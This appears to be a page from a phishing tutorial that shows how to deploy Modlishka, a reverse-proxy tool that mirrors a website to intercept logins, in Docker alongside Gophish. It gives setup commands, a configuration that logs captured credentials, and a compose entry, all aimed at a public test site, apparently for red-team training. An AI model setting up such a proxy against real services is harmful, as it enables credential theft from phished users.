+++
title = "Modlishka"
weight = 65
+++

### Modlishka

Modlishka is an amazing tool that can mirror a website on the fly, rewriting links to ensure the site functions. This allows us to essentially MitM connections to our targeted service from a domain we control.

Lets get a checkout of Modlishka and get things setup to be run in docker.

```bash
mkdir ~/Desktop/op/docker/modlishka
cd ~/Desktop/op/docker/modlishka
mkdir modlishka-data
touch modlishka-data/config.json
git clone https://github.com/Stage2Sec/Modlishka.git
cd Modlishka
cp extra/docker/* .
```

Modlishka can take command line arguments or a configuration file. We are opting to use the configuration file. Lets add the following to `~/Desktop/op/docker/modlishka/modlishka-data/config.json`

```json
{
  "proxyDomain": "modlishka.docker",
  "target": "testphp.vulnweb.com",
  "trackingCookie": "iamadumbcookie",
  "trackingParam": "rid",
  "controlCreds": "phisherman:phisherpass",
  "controlURL": "livewell",
  "terminateRedirectUrl": "",
  "terminateTriggers": "/nowhere",
  "allowSecureCookies": true,
  "listeningAddress": "0.0.0.0",
  "targetResources": "",
  "jsRules": "",
  "jsReflectParam": "reflect",
  "proxyAddress": "",
  "forceHTTPS": false,
  "forceHTTP": false,
  "dynamicMode": false,
  "debug": true,
  "logPostOnly": false,
  "disableSecurity": false,
  "log": "/data/creds.log",
  "plugins": "all",
  "cert": "",
  "certKey": "",
  "certPool": "",
  "rules": "",
  "credParams": ""
}
```

The `trackingParam` value is what Modlishka uses to determine what visits belong to what users, we'll map this to `rid` since that is what Gophish uses by default.

Now we can add Modlishka to our docker compose services.

```yml
  modlishka:
    build:
      context: "modlishka/Modlishka/"
    entrypoint: /bin/proxy
    command: -config /data/config.json
    container_name: modlishka
    environment:
      - VIRTUAL_HOST=modlishka.docker
    volumes:
      - "./modlishka/modlishka-data:/data"
```

Lets test it out. Lets stop docker compose and restart it:

```bash
sudo docker compose up
```

Now open [http://modlishka.docker/](http://modlishka.docker/). We should see the Accunetix test site being hosted from our fake domain.

![Modlishka Accunetix Test Site](/static/how-to-phishing/modlishka-accunetix-test-site.png)